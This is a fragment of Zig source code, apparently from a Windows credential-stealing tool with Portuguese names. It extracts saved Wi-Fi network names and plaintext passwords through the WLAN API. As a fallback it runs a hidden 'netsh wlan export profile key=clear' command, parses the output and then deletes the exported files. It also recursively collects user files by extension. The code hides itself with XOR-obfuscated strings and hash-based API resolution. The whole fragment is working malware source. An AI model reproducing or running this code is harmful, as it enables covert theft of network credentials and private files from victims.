    const WlanGetProfileList = @as(*const fn (usize, *const GUID, ?*anyopaque, *?*WLAN_PROFILE_INFO_LIST) callconv(.winapi) u32, @ptrFromInt(list_prof_addr));
    // NOTE: parameter order is (hClient, pGuid, name, pdwFlags, ppstrProfileXml, pdwGrantedAccess, pReserved)
    const WlanGetProfile = @as(*const fn (usize, *const GUID, [*:0]const u16, *u32, *?[*:0]u16, *u32, ?*anyopaque) callconv(.winapi) u32, @ptrFromInt(get_prof_addr));

    var negotiated_version: usize = 0;
    var client_handle: usize = 0;
    if (WlanOpenHandle(2, null, &negotiated_version, &client_handle) != 0) return false;
    defer _ = WlanCloseHandle(client_handle, null);

    var interface_list: ?*WLAN_INTERFACE_INFO_LIST = null;
    if (WlanEnumInterfaces(client_handle, null, &interface_list) != 0) return false;
    if (interface_list == null) return true;
    defer WlanFreeMemory(@ptrCast(interface_list));

    const ifaces = @as([*]const WLAN_INTERFACE_INFO, @ptrCast(&interface_list.?.InterfaceInfo));
    const num_ifaces = interface_list.?.dwNumberOfItems;

    var saw_profile = false;
    var got_profile = false;

    var ii: u32 = 0;
    while (ii < num_ifaces) : (ii += 1) {
        const guid = &ifaces[ii].InterfaceGuid;

        var profile_list: ?*WLAN_PROFILE_INFO_LIST = null;
        if (WlanGetProfileList(client_handle, guid, null, &profile_list) != 0) continue;
        if (profile_list == null) continue;
        defer WlanFreeMemory(@ptrCast(profile_list));

        const profiles = @as([*]const WLAN_PROFILE_INFO, @ptrCast(&profile_list.?.ProfileInfo));
        const num_profiles = profile_list.?.dwNumberOfItems;

        var pi: u32 = 0;
        while (pi < num_profiles) : (pi += 1) {
            saw_profile = true;

            // WLAN_PROFILE_GET_PLAINTEXT_KEY = 0x00000004 (must be set on input)
            var flags: u32 = 0x00000004;
            var granted_access: u32 = 0;
            var xml_str: ?[*:0]u16 = null;

            const profile_name = @as([*:0]const u16, @ptrCast(&profiles[pi].strProfileName));
            const result = WlanGetProfile(client_handle, guid, profile_name, &flags, &xml_str, &granted_access, null);
            if (result != 0 or xml_str == null) continue;
            defer WlanFreeMemory(@ptrCast(xml_str));

            var xml_len: usize = 0;
            while (xml_str.?[xml_len] != 0) : (xml_len += 1) {}
            if (xml_len == 0) continue;

            const xml_u8 = std.unicode.utf16LeToUtf8Alloc(allocator, xml_str.?[0..xml_len]) catch continue;
            defer allocator.free(xml_u8);

            var senha: []const u8 = "";
            if (std.mem.indexOf(u8, xml_u8, "<keyMaterial>")) |ks| {
                if (std.mem.indexOfPos(u8, xml_u8, ks, "</keyMaterial>")) |ke| {
                    senha = std.mem.trim(u8, xml_u8[ks + 13 .. ke], " \r\n\t");
                }
            }

            var name_len: usize = 0;
            while (name_len < profiles[pi].strProfileName.len and profiles[pi].strProfileName[name_len] != 0) : (name_len += 1) {}
            if (name_len == 0) continue;
            const ssid = std.unicode.utf16LeToUtf8Alloc(allocator, profiles[pi].strProfileName[0..name_len]) catch continue;
            defer allocator.free(ssid);

            col.wifi.append(allocator, .{
                .ssid = allocator.dupe(u8, ssid) catch continue,
                .senha = allocator.dupe(u8, senha) catch continue,
            }) catch continue;
            got_profile = true;
        }
    }

    // If no profile exists at all, we still succeeded (netsh would find nothing).
    return got_profile or !saw_profile;
}

fn getWifiViaNetsh(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    // Fallback: use netsh wlan export profile key=clear
    const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return;

    const create_proc_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("CreateProcessW")) catch 0;
    const wait_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("WaitForSingleObject")) catch 0;
    const close_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("CloseHandle")) catch 0;
    if (create_proc_addr == 0 or wait_addr == 0 or close_addr == 0) return;

    const CreateProcessW = @as(*const fn (?[*:0]const u16, ?[*:0]u16, ?*anyopaque, ?*anyopaque, i32, u32, ?*anyopaque, ?[*:0]const u16, *anyopaque, *anyopaque) callconv(.winapi) i32, @ptrFromInt(create_proc_addr));
    const WaitForSingleObject = @as(*const fn (?*anyopaque, u32) callconv(.winapi) u32, @ptrFromInt(wait_addr));
    const CloseHandle = @as(*const fn (?*anyopaque) callconv(.winapi) i32, @ptrFromInt(close_addr));

    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    // Build command: netsh wlan export profile key=clear folder=<TEMP>
    const cmd = std.fmt.allocPrint(allocator, "netsh wlan export profile key=clear folder=\"{s}\"", .{temp}) catch return;
    defer allocator.free(cmd);

    const STARTUPINFOW = extern struct {
        cb: u32,
        lpReserved: ?[*:0]u16,
        lpDesktop: ?[*:0]u16,
        lpTitle: ?[*:0]u16,
        dwX: u32,
        dwY: u32,
        dwXSize: u32,
        dwYSize: u32,
        dwXCountChars: u32,
        dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        cbReserved2: u16,
        lpReserved2: ?*u8,
        hStdInput: ?*anyopaque,
        hStdOutput: ?*anyopaque,
        hStdError: ?*anyopaque,
    };
    const PROCESS_INFORMATION = extern struct {
        hProcess: ?*anyopaque,
        hThread: ?*anyopaque,
        dwProcessId: u32,
        dwThreadId: u32,
    };

    var si: STARTUPINFOW = std.mem.zeroes(STARTUPINFOW);
    si.cb = @sizeOf(STARTUPINFOW);
    si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
    si.wShowWindow = 0; // SW_HIDE
    var pi: PROCESS_INFORMATION = std.mem.zeroes(PROCESS_INFORMATION);

    // Use cmd.exe /c to run netsh
    const cmd_line_tmp = std.fmt.allocPrint(allocator, "cmd.exe /c {s}", .{cmd}) catch return;
    defer allocator.free(cmd_line_tmp);
    const cmd_line = allocator.dupeZ(u8, cmd_line_tmp) catch return;
    defer allocator.free(cmd_line);
    const cmd_line_w = std.unicode.utf8ToUtf16LeAllocZ(allocator, cmd_line) catch return;
    defer allocator.free(cmd_line_w);

    if (CreateProcessW(null, @constCast(cmd_line_w.ptr), null, null, 0, 0x00000008, null, null, &si, &pi) == 0) return;
    defer {
        if (pi.hProcess) |h| _ = CloseHandle(h);
        if (pi.hThread) |h| _ = CloseHandle(h);
    }

    _ = WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout

    // Parse exported XML files (Wi-Fi-<SSID>.xml)
    var dir_iter = winfs.DirIter.open(temp) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);
        if (entry.is_dir) continue;
        if (!std.mem.startsWith(u8, entry.name, "Wi-Fi-") or !std.mem.endsWith(u8, entry.name, ".xml")) continue;

        const xml_path = std.fs.path.join(allocator, &[_][]const u8{ temp, entry.name }) catch continue;
        defer allocator.free(xml_path);

        const content = winfs.readFileAlloc(allocator, xml_path, 256 * 1024) catch continue;
        defer allocator.free(content);

        // Extract SSID from filename: Wi-Fi-<SSID>.xml
        var ssid: []const u8 = "";
        if (entry.name.len > 10) {
            ssid = entry.name[6 .. entry.name.len - 4];
        }

        // Extract keyMaterial from XML
        var senha: []const u8 = "";
        if (std.mem.indexOf(u8, content, "<keyMaterial>")) |ks| {
            if (std.mem.indexOfPos(u8, content, ks, "</keyMaterial>")) |ke| {
                senha = std.mem.trim(u8, content[ks + 13 .. ke], " \r\n\t");
            }
        }

        col.wifi.append(allocator, .{
            .ssid = allocator.dupe(u8, ssid) catch "",
            .senha = allocator.dupe(u8, senha) catch "",
        }) catch {};

        // Clean up the exported XML file
        winfs.deleteFile(xml_path) catch {};
    }
}

pub fn pegarArquivos(allocator: std.mem.Allocator, extensoes: []const []const u8, max_size: i64, caminhos: []const []const u8) ![]coleta.ArquivoGrab {
    var resultados: std.ArrayList(coleta.ArquivoGrab) = .empty;

    const user_profile = furtivo.getEnvVar(allocator, "USERPROFILE") catch return try resultados.toOwnedSlice(allocator);
    defer allocator.free(user_profile);

    for (caminhos) |caminho| {
        const search_dir = std.fs.path.join(allocator, &[_][]const u8{ user_profile, caminho }) catch continue;
        defer allocator.free(search_dir);

        pegarArquivosRec(allocator, search_dir, extensoes, max_size, &resultados, 0) catch {};
    }

    return try resultados.toOwnedSlice(allocator);
}

fn pegarArquivosRec(allocator: std.mem.Allocator, dir_path: []const u8, extensoes: []const []const u8, max_size: i64, resultados: *std.ArrayList(coleta.ArquivoGrab), depth: usize) !void {
    const max_depth: usize = 10;
    const max_files: usize = 500;
    if (depth >= max_depth) return;
    if (resultados.items.len >= max_files) return;

    var dir_iter = winfs.DirIter.open(dir_path) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);

        if (resultados.items.len >= max_files) break;

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name }) catch continue;

        if (entry.is_dir) {
            // Skip junction/symlink directories (reparse points) to avoid infinite loops
            if (entry.is_reparse_point) {
                allocator.free(full_path);
                continue;
            }
            pegarArquivosRec(allocator, full_path, extensoes, max_size, resultados, depth + 1) catch {};
            allocator.free(full_path);
            continue;
        }

        const ext = std.fs.path.extension(entry.name);
        var matched = false;
        for (extensoes) |e| {
            if (std.ascii.eqlIgnoreCase(ext, e)) {
                matched = true;
                break;
            }
        }
        if (!matched) {
            allocator.free(full_path);
            continue;
        }

        const content = winfs.readFileAlloc(allocator, full_path, @intCast(max_size)) catch {
            allocator.free(full_path);
            continue;
        };

        resultados.append(allocator, .{
            .path = full_path,
            .content = content,
        }) catch {
            allocator.free(full_path);
            allocator.free(content);
        };
    }
}
